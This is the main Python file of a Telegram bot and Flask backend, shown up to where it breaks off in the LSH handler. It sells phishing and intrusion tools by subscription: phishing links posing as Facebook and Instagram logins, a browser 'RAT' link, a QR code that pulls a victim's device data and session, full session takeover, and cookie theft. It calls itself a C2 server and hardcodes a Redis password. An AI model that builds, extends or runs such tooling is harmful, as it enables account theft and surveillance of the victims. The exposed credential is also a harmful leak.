# main.py
import os
import io
import time
import json
import threading
import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, jsonify, redirect
import redis
import uuid

# ============================================================
# استيراد ملفات الأدوات
# ============================================================
try:
    from facebook_module import init_facebook_routes
except Exception as e:
    print(f"[-] Error importing facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None

try:
    from instagram_module import init_instagram_routes
except Exception as e:
    print(f"[-] Error importing instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None

try:
    from rat_module import init_rat_routes, rat_bp, queue_command
except Exception as e:
    print(f"[-] Error importing rat_module: {e}")
    init_rat_routes = lambda app, bot: None
    rat_bp = None
    queue_command = lambda *args: None

try:
    from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
except Exception as e:
    print(f"[-] Error importing qr_pairing: {e}")
    init_qr_routes = lambda app, bot: None
    qr_bp = None
    generate_qr_code_bytes = lambda *args: None

# ============================================================
# استيراد LSH Module
# ============================================================
try:
    from lsh_module import (
        init_lsh_routes,
        lsh_bp,
        generate_qr_code_bytes as lsh_generate_qr,
        set_bot_reference,
        push_command as lsh_push_command,
        get_session as lsh_get_session,
        build_lsh_control_panel,
    )
    LSH_ENABLED = True
except Exception as e:
    print(f"[-] Error importing lsh_module: {e}")
    LSH_ENABLED = False

    def init_lsh_routes(app, bot): pass
    def set_bot_reference(bot): pass
    def lsh_push_command(*a, **kw): return False
    def lsh_get_session(*a, **kw): return None
    def lsh_generate_qr(*a, **kw): return io.BytesIO()
    def build_lsh_control_panel(*a, **kw): return InlineKeyboardMarkup()
    lsh_bp = None

# ============================================================
# استيراد Session Hunter
# ============================================================
try:
    from session_hunter import (
        init_session_hunter_routes,
        sh_bp,
        get_sh_data,
        build_sh_panel,
        SUPPORTED_SITES,
        create_session as sh_create_session,
        generate_login_page as sh_generate_login_page,
    )
    SH_ENABLED = True
    print("[+] session_hunter imported")
except Exception as e:
    print(f"[-] Error importing session_hunter: {e}")
    SH_ENABLED = False

    def init_session_hunter_routes(app, bot): pass
    sh_bp = None
    def get_sh_data(sid): return {}
    def build_sh_panel(sid, cid): return InlineKeyboardMarkup()
    SUPPORTED_SITES = {}
    def sh_create_session(*a, **kw): return None
    def sh_generate_login_page(*a, **kw): return "Error: session_hunter not loaded"

# ============================================================
# استيراد نظام الدفع + الأدمن
# ============================================================
try:
    from stars_payment import (
        register_payment_handlers,
        get_or_create_user,
        can_use_tool,
        consume_usage,
        build_plans_keyboard,
        build_main_payment_keyboard,
        build_account_text,
        build_plans_text,
        send_invoice,
        PRICING_PLANS,
        FREE_TRIAL_USES,
        AVAILABLE_TOOLS,
        is_admin,
        is_vip,
        get_all_users,
        get_user,
        save_user,
        delete_user,
        ban_user,
        unban_user,
        activate_subscription,
        build_admin_menu,
        build_admin_users_keyboard,
        build_user_detail_keyboard,
        build_user_info_text,
        build_admin_stats_text,
        ADMIN_IDS,
        VIP_IDS,
    )
    PAYMENT_ENABLED = True
    print("[+] stars_payment imported")
except Exception as e:
    print(f"[-] Error importing stars_payment: {e}")
    PAYMENT_ENABLED = False

    def register_payment_handlers(bot): pass
    def get_or_create_user(*a, **kw): return {}
    def can_use_tool(*a, **kw): return {"allowed": True, "reason": "bypass"}
    def consume_usage(*a, **kw): return True
    def build_plans_keyboard(): return InlineKeyboardMarkup()
    def build_main_payment_keyboard(): return InlineKeyboardMarkup()
    def build_account_text(*a, **kw): return "نظام الدفع معطّل"
    def build_plans_text(): return "نظام الدفع معطّل"
    def send_invoice(*a, **kw): pass
    PRICING_PLANS = {}
    FREE_TRIAL_USES = 1
    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh"]
    def is_admin(uid): return False
    def is_vip(uid): return False
    def get_all_users(): return []
    def get_user(uid): return None
    def save_user(uid, u): return False
    def delete_user(uid): return False
    def ban_user(uid): return False
    def unban_user(uid): return False
    def activate_subscription(uid, pk): return {}
    def build_admin_menu(): return InlineKeyboardMarkup()
    def build_admin_users_keyboard(*a, **kw): return InlineKeyboardMarkup()
    def build_user_detail_keyboard(*a, **kw): return InlineKeyboardMarkup()
    def build_user_info_text(*a, **kw): return ""
    def build_admin_stats_text(): return ""
    ADMIN_IDS = []
    VIP_IDS = []


# ============================================================
# إعدادات عامة
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
PUBLIC_URL = os.getenv("PUBLIC_URL", "https://sec.h42536974.workers.dev")
RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
RAILWAY_URL = PUBLIC_URL

print(f"[+] Public URL: {PUBLIC_URL}")
print(f"[+] Internal URL: {RAILWAY_URL}")


# ============================================================
# Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()

if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

print(f"[+] Redis URL configured: {REDIS_URL[:45]}...")


def _try_redis(url):
    try:
        client = redis.Redis.from_url(
            url,
            decode_responses=True,
            socket_timeout=10,
            socket_connect_timeout=10,
            retry_on_timeout=True,
            health_check_interval=30,
        )
        client.ping()
        return client
    except Exception as e:
        print(f"[-] Redis try failed ({url[:30]}...): {e}")
        return None


redis_client = _try_redis(REDIS_URL)

if not redis_client and REDIS_URL.startswith("redis://"):
    tls_url = REDIS_URL.replace("redis://", "rediss://", 1)
    print(f"[+] Trying TLS fallback...")
    redis_client = _try_redis(tls_url)
    if redis_client:
        REDIS_URL = tls_url
        print("[+] TLS connection succeeded!")

if not redis_client and REDIS_URL.startswith("rediss://"):
    non_tls = REDIS_URL.replace("rediss://", "redis://", 1)
    print(f"[+] Trying non-TLS fallback...")
    redis_client = _try_redis(non_tls)
    if redis_client:
        REDIS_URL = non_tls
        print("[+] Non-TLS connection succeeded!")

if redis_client:
    print("[+] main: Redis connected successfully")
else:
    print("[-] main: Redis FAILED — some features may not work")

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing!")

print(f"[+] Bot token configured: {BOT_TOKEN[:10]}...")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)


# ============================================================
# Origin Gate — حماية من الوصول المباشر
# ============================================================
ORIGIN_SECRET = os.getenv("ORIGIN_SECRET", "a7f3k9x2m5p8q1w4e6r0t3y7u2i5o8s1")

ORIGIN_GATE_EXEMPT = [
    '/',
    '/health',
]

@app.before_request
def verify_origin():
    if request.path in ORIGIN_GATE_EXEMPT:
        return None
    if request.method == 'OPTIONS':
        return None
    secret = request.headers.get('X-Origin-Secret', '')
    if secret == ORIGIN_SECRET:
        return None
    client_ip = (request.headers.get('CF-Connecting-IP') or 
                 request.headers.get('X-Forwarded-For') or 
                 request.remote_addr)
    print(f"[-] BLOCKED direct access to {request.path} from {client_ip}")
    return jsonify({
        "error": "Access denied",
        "message": "This endpoint requires the official application",
        "hint": "Please use the official link"
    }), 403


# ============================================================
# Health check
# ============================================================
@app.route('/')
def health_check():
    return "C2 Server and Telegram Bot are active and running smoothly.", 200


# ============================================================
# ★★★ نظام الرابط القصير ★★★
# ============================================================
def generate_short_code(length=8):
    """يولّد كود قصير (8 أحرف)"""
    import random
    chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789'
    return ''.join(random.choices(chars, k=length))


def save_short_link(code, chat_id, site):
    """يحفظ كود مختصر في Redis"""
    if not redis_client:
        return False
    try:
        ttl = 86400 * 7
        redis_client.setex(
            f"short:{code}",
            ttl,
            json.dumps({
                "chat_id": str(chat_id),
                "site": site,
                "created_at": time.time()
            })
        )
        return True
    except Exception as e:
        print(f"[-] save_short_link error: {e}")
        return False


def get_short_link(code):
    """يجلب بيانات كود مختصر"""
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"short:{code}")
        if raw:
            return json.loads(raw)
    except Exception as e:
        print(f"[-] get_short_link error: {e}")
    return None


# ============================================================
# تسجيل Blueprints ومسارات
# ============================================================
if rat_bp:
    app.register_blueprint(rat_bp)
if qr_bp:
    app.register_blueprint(qr_bp)
if LSH_ENABLED and lsh_bp:
    app.register_blueprint(lsh_bp)
if SH_ENABLED and sh_bp:
    app.register_blueprint(sh_bp)

init_facebook_routes(app, bot)
init_instagram_routes(app, bot)
init_rat_routes(app, bot)
init_qr_routes(app, bot)
init_lsh_routes(app, bot)
init_session_hunter_routes(app, bot)

if LSH_ENABLED:
    set_bot_reference(bot)

register_payment_handlers(bot)


# ============================================================
# ★★★ مسار الرابط القصير: /f/XXXXXXXX ★★★
# ★★★ يولّد الصفحة مباشرة (بدون redirect) ★★★
# ============================================================
@app.route('/f/<code>', methods=['GET'])
def short_link_show(code):
    """يستقبل الرابط القصير ويعرض الصفحة مباشرة"""
    # جلب بيانات الكود
    meta = get_short_link(code)
    if not meta:
        return """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><title>رابط منتهي</title>
<style>body{font-family:sans-serif;background:#f5f7fa;text-align:center;padding:80px 20px}
h1{color:#e11d48}</style></head>
<body><h1>❌ الرابط منتهي الصلاحية</h1><p>يرجى طلب رابط جديد</p></body></html>""", 410
    
    chat_id = str(meta.get("chat_id"))
    site = meta.get("site", "facebook")
    
    # ★★★ ولّد session_id حقيقي (24 حرف) ★★★
    session_id = uuid.uuid4().hex[:24]
    
    # ★★★ احفظ الجلسة في Redis ★★★
    if redis_client:
        try:
            redis_client.setex(
                f"sh_session:{session_id}",
                86400 * 7,
                json.dumps({"chat_id": chat_id, "target_site": site})
            )
        except Exception as e:
            print(f"[-] Redis save session error: {e}")
    
    # ★★★ أنشئ الجلسة في الذاكرة ★★★
    try:
        sh_create_session(session_id, chat_id, site)
    except Exception as e:
        print(f"[-] sh_create_session error: {e}")
    
    # ★★★ ولّد صفحة تسجيل الدخول مباشرة (بدون redirect) ★★★
    try:
        html = sh_generate_login_page(session_id, chat_id, site)
        return html, 200
    except Exception as e:
        print(f"[-] sh_generate_login_page error: {e}")
        import traceback
        traceback.print_exc()
        # fallback
        return f"<h1>Error: {e}</h1>", 500


# ============================================================
# القوائم
# ============================================================
def main_menu(user_id=None):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
    markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
    markup.add(InlineKeyboardButton("🍪 سرقة الكوكيز والجلسات (SH)", callback_data="gen_sh"))
    markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    
    if user_id and is_admin(user_id):
        markup.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))
    
    return markup


def payment_menu():
    return build_main_payment_keyboard()


# ============================================================
# رسائل مساعدة
# ============================================================
def _deny_message(reason, user_id, tool, data=None):
    data = data or {}
    if reason == "banned":
        return (
            "🚫 **أنت محظور من استخدام البوت.**\n\n"
            "إذا كنت تعتقد أن هذا خطأ، تواصل مع الإدارة."
        )
    if reason == "daily_limit_reached":
        return (
            "⚠️ **وصلت للحد اليومي لباقتك الحالية.**\n\n"
            f"🎯 الحد اليومي: {data.get('daily_limit', 0)} عملية\n"
            "💎 قم بترقية باقتك أو انتظر لليوم التالي."
        )
    if reason == "no_credit":
        return (
            "❌ **لا يوجد لديك استخدام متاح لهذه الأداة.**\n\n"
            f"🎁 حصلت على {FREE_TRIAL_USES} استخدام مجاني فقط عند التسجيل.\n"
            "💎 اشترك في إحدى الباقات للاستمرار.\n\n"
            "اضغط على 💎 الاشتراكات والدفع لعرض الباقات."
        )
    return "❌ لا يمكن استخدام الأداة حالياً."


# ============================================================
# Start Command
# ============================================================
@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    print(f"[+] /start from {message.from_user.id}")
    user_name = message.from_user.first_name
    get_or_create_user(
        message.from_user.id,
        message.from_user.username or "Unknown",
        user_name
    )
    
    if is_admin(message.from_user.id):
        text = (
            f"👑 **مرحباً أيها الأدمن {user_name}!**\n\n"
            f"⚡ لديك صلاحيات كاملة على النظام.\n"
            f"💎 أنت VIP لا نهائي — كل الأدوات مفتوحة بدون حدود.\n\n"
            f"🎛️ استخدم **لوحة تحكم الأدمن** للتحكم الكامل."
        )
    else:
        text = (
            f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
            "غير مسؤول تماماً عن إساءة الاستخدام.\n\n"
            f"🎁 لديك {FREE_TRIAL_USES} استخدام مجاني لكل أداة."
        )
    
    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=main_menu(message.from_user.id)
    )


# ============================================================
# Callback Handler
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id

    # ============================================================
    # قسم الدفع
    # ============================================================
    if call.data == "payment_menu":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "💎 **قسم الاشتراكات والدفع**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "اختر ما تريد:",
            parse_mode="Markdown",
            reply_markup=build_main_payment_keyboard()
        )
        return

    if call.data == "show_plans":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            build_plans_text(),
            parse_mode="Markdown",
            reply_markup=build_plans_keyboard()
        )
        return

    if call.data.startswith("buy_plan_"):
        plan_key = call.data.replace("buy_plan_", "")
        bot.answer_callback_query(call.id, "جاري تجهيز الفاتورة...")
        send_invoice(bot, chat_id, plan_key)
        return

    if call.data == "my_account":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_account_text(chat_id), parse_mode="Markdown")
        return

    if call.data == "back_to_main":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "القائمة الرئيسية:",
            reply_markup=main_menu(user_id)
        )
        return

    # ============================================================
    # لوحة الأدمن
    # ============================================================
    if call.data == "admin_panel":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ أنت لست أدمن", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "👑 **لوحة تحكم الأدمن**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "اختر العملية المطلوبة:",
            reply_markup=build_admin_menu(),
            parse_mode="Markdown"
        )
        return

    if call.data.startswith("admin_users_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try:
            page = int(call.data.replace("admin_users_", ""))
        except ValueError:
            page = 0
        users = get_all_users()
        if not users:
            bot.answer_callback_query(call.id, "لا يوجد مستخدمون", show_alert=True)
            return
        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            f"👥 **قائمة المستخدمين** ({len(users)})\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"اختر مستخدم لعرض التفاصيل:",
            reply_markup=build_admin_users_keyboard(users, page),
            parse_mode="Markdown"
        )
        return

    if call.data.startswith("admin_user_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try:
            uid = int(call.data.replace("admin_user_", ""))
        except ValueError:
            bot.answer_callback_query(call.id, "❌ رقم خاطئ", show_alert=True)
            return
        user = get_user(uid)
        if not user:
            bot.answer_callback_query(call.id, "❌ مستخدم غير موجود", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            build_user_info_text(uid, user),
            reply_markup=build_user_detail_keyboard(uid, user),
            parse_mode="Markdown"
        )
        return

    if call.data.startswith("admin_ban_user_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try:
            uid = int(call.data.replace("admin_ban_user_", ""))
        except ValueError:
            return
        ban_user(uid)
        bot.answer_callback_query(call.id, "✅ تم الحظر", show_alert=True)
        user = get_user(uid)
        if user:
            try:
                bot.edit_message_text(
                    build_user_info_text(uid, user),
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    reply_markup=build_user_detail_keyboard(uid, user),
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        return

    if call.data.startswith("admin_unban_user_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try:
            uid = int(call.data.replace("admin_unban_user_", ""))
        except ValueError:
            return
        unban_user(uid)
        bot.answer_callback_query(call.id, "✅ تم فك الحظر", show_alert=True)
        user = get_user(uid)
        if user:
            try:
                bot.edit_message_text(
                    build_user_info_text(uid, user),
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    reply_markup=build_user_detail_keyboard(uid, user),
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        return

    if call.data.startswith("admin_grant_vip_user_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try:
            uid = int(call.data.replace("admin_grant_vip_user_", ""))
        except ValueError:
            return
        user = get_or_create_user(uid)
        user["is_vip"] = True
        save_user(uid, user)
        bot.answer_callback_query(call.id, "💎 تم منح VIP", show_alert=True)
        try:
            bot.send_message(uid,
                "💎 **تهانينا!**\n\n"
                "تم منحك عضوية **VIP** من الإدارة.\n"
                "يمكنك الآن استخدام كل الأدوات بدون أي حدود! 🚀",
                parse_mode="Markdown")
        except Exception:
            pass
        user = get_user(uid)
        if user:
            try:
                bot.edit_message_text(
                    build_user_info_text(uid, user),
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    reply_markup=build_user_detail_keyboard(uid, user),
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        return

    if call.data.startswith("admin_remove_vip_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try:
            uid = int(call.data.replace("admin_remove_vip_", ""))
        except ValueError:
            return
        user = get_or_create_user(uid)
        user["is_vip"] = False
        save_user(uid, user)
        bot.answer_callback_query(call.id, "✅ تم إزالة VIP", show_alert=True)
        user = get_user(uid)
        if user:
            try:
                bot.edit_message_text(
                    build_user_info_text(uid, user),
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    reply_markup=build_user_detail_keyboard(uid, user),
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        return

    if call.data.startswith("admin_delete_user_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try:
            uid = int(call.data.replace("admin_delete_user_", ""))
        except ValueError:
            return
        delete_user(uid)
        bot.answer_callback_query(call.id, "🗑️ تم الحذف", show_alert=True)
        try:
            bot.edit_message_text(
                f"🗑️ **تم حذف المستخدم** `{uid}`",
                chat_id=chat_id,
                message_id=call.message.message_id,
                parse_mode="Markdown"
            )
        except Exception:
            pass
        return

    if call.data.startswith("admin_give_sub_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try:
            uid = int(call.data.replace("admin_give_sub_", ""))
        except ValueError:
            return
        bot.answer_callback_query(call.id)
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("⭐ أساسية (30 يوم)", callback_data=f"admin_activate_basic_{uid}"),
            InlineKeyboardButton("💎 احترافية (30 يوم)", callback_data=f"admin_activate_pro_{uid}"),
        )
        markup.row(
            InlineKeyboardButton("👑 VIP (90 يوم)", callback_data=f"admin_activate_vip_{uid}"),
        )
        markup.row(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))
        bot.send_message(
            chat_id,
            f"📅 **اختر الباقة للمستخدم** `{uid}`",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return

    if call.data.startswith("admin_activate_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        parts = call.data.replace("admin_activate_", "").rsplit("_", 1)
        if len(parts) != 2:
            return
        plan_key, uid_str = parts
        try:
            uid = int(uid_str)
        except ValueError:
            return
        try:
            user = activate_subscription(uid, plan_key)
            plan = PRICING_PLANS.get(plan_key)
            bot.answer_callback_query(call.id, f"✅ تم تفعيل {plan['name']}", show_alert=True)
            try:
                from datetime import datetime as _dt
                expires = _dt.fromisoformat(user["subscription"]["expires_at"])
                bot.send_message(uid,
                    f"🎉 **تم تفعيل اشتراكك!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"💎 الباقة: {plan['name']}\n"
                    f"📅 ينتهي في: `{expires.strftime('%Y-%m-%d')}`\n"
                    f"🎯 الحد اليومي: {plan['daily_limit']} عملية",
                    parse_mode="Markdown")
            except Exception:
                pass
        except Exception as e:
            bot.answer_callback_query(call.id, f"❌ خطأ: {e}", show_alert=True)
        return

    if call.data == "admin_stats":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            build_admin_stats_text(),
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
            ),
            parse_mode="Markdown"
        )
        return

    if call.data == "admin_recent":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        users = get_all_users()
        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
        recent = users[:10]
        lines = ["🆕 **آخر 10 مستخدمين:**\n━━━━━━━━━━━━━━━━━━"]
        for u in recent:
            uid = u.get("user_id")
            name = u.get("first_name", "Unknown")
            created = u.get("created_at", "")[:19].replace("T", " ")
            icon = "👑" if is_admin(uid) else "💎" if u.get("is_vip") else "🚫" if u.get("is_banned") else "👤"
            lines.append(f"{icon} **{name}** — `{uid}`\n   📅 {created}")
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "\n".join(lines),
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
            ),
            parse_mode="Markdown"
        )
        return

    if call.data == "admin_search":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id,
            "🔍 **أرسل ID المستخدم أو username للبحث:**",
            parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_search_handler)
        return

    if call.data == "admin_broadcast":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id,
            "📢 **أرسل الرسالة التي تريد إرسالها للجميع:**",
            parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_broadcast_handler)
        return

    if call.data == "admin_add_sub":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id,
            "➕ **أرسل ID المستخدم لإضافة باقة له:**",
            parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_add_sub_handler)
        return

    if call.data == "admin_ban":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id,
            "🚫 **أرسل ID المستخدم لحظره:**",
            parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_ban_handler)
        return

    if call.data == "admin_unban":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id,
            "✅ **أرسل ID المستخدم لفك حظره:**",
            parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_unban_handler)
        return

    if call.data == "admin_delete":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id,
            "🗑️ **أرسل ID المستخدم لحذفه نهائياً:**",
            parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_delete_handler)
        return

    if call.data == "admin_grant_vip":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id,
            "💎 **أرسل ID المستخدم لمنحه VIP:**",
            parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_grant_vip_handler)
        return

    if call.data == "admin_give_stars":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id,
            "⭐ **أرسل بالشكل:** `user_id|amount`\n"
            "مثال: `123456|100`",
            parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_give_stars_handler)
        return

    if call.data.startswith("admin_msg_user_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try:
            uid = int(call.data.replace("admin_msg_user_", ""))
        except ValueError:
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, f"📨 **أرسل الرسالة للمستخدم** `{uid}`:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, lambda m, u=uid: admin_msg_user_handler(m, u))
        return

    if call.data == "noop":
        bot.answer_callback_query(call.id)
        return

    # ============================================================
    # توليد فيسبوك
    # ============================================================
    if call.data == "gen_fb":
        check = can_use_tool(chat_id, "fb")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "fb", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "fb")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
        link = f"{PUBLIC_URL}/login.php?id={chat_id}"
        bot.send_message(chat_id, f"🎯 رابط فيسبوك المخصص:\n `{link}` ", parse_mode="Markdown")
        return

    # ============================================================
    # توليد انستقرام
    # ============================================================
    if call.data == "gen_ig":
        check = can_use_tool(chat_id, "ig")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "ig", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "ig")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
        link = f"{PUBLIC_URL}/ig_login.php?id={chat_id}"
        bot.send_message(chat_id, f"📸 رابط انستقرام المخصص:\n `{link}` ", parse_mode="Markdown")
        return

    # ============================================================
    # توليد RAT
    # ============================================================
    if call.data == "gen_rat":
        check = can_use_tool(chat_id, "rat")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "rat", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "rat")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي...")
        link = f"{PUBLIC_URL}/system_secure_v2?id={chat_id}"
        bot.send_message(
            chat_id,
            f"📱 رابط المراقبة والتحكم الخلفي المطور جاهز:\n `{link}` \n\n"
            "بمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.",
            parse_mode="Markdown"
        )
        return

    # ============================================================
    # توليد QR
    # ============================================================
    if call.data == "gen_qr":
        check = can_use_tool(chat_id, "qr")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "qr", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "qr")
        bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
        token = str(uuid.uuid4())[:8]
        if redis_client:
            try:
                redis_client.setex(f"qr_token:{token}", 300, chat_id)
            except Exception as e:
                print(f"Redis write error: {e}")

        target_link = f"{PUBLIC_URL}/qr_scan_target?token={token}"
        qr_image = generate_qr_code_bytes(target_link)
        if qr_image:
            qr_image.name = 'pairing_qr.jpg'
            bot.send_photo(
                chat_id,
                qr_image,
                caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\n"
                        "بمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز "
                        "وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
                parse_mode="Markdown"
            )
        else:
            bot.send_message(chat_id, f"🎯 **رابط الـ QR المباشر:**\n`{target_link}`", parse_mode="Markdown")
        return

    # ============================================================
    # توليد LSH
    # ============================================================
    if call.data == "gen_lsh":
        check = can_use_tool(chat_id, "lsh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "lsh", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "lsh")
        bot.answer_callback_query(call.id, "جاري تجهيز جلسة التحكم الكامل...")

        session_id = str(uuid.uuid4()).replace('-', '')[:24]
        if redis_client:
            try:
                redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
            except Exception as e:
                print(f"[-] Redis setex LSH error: {e}")

        try:
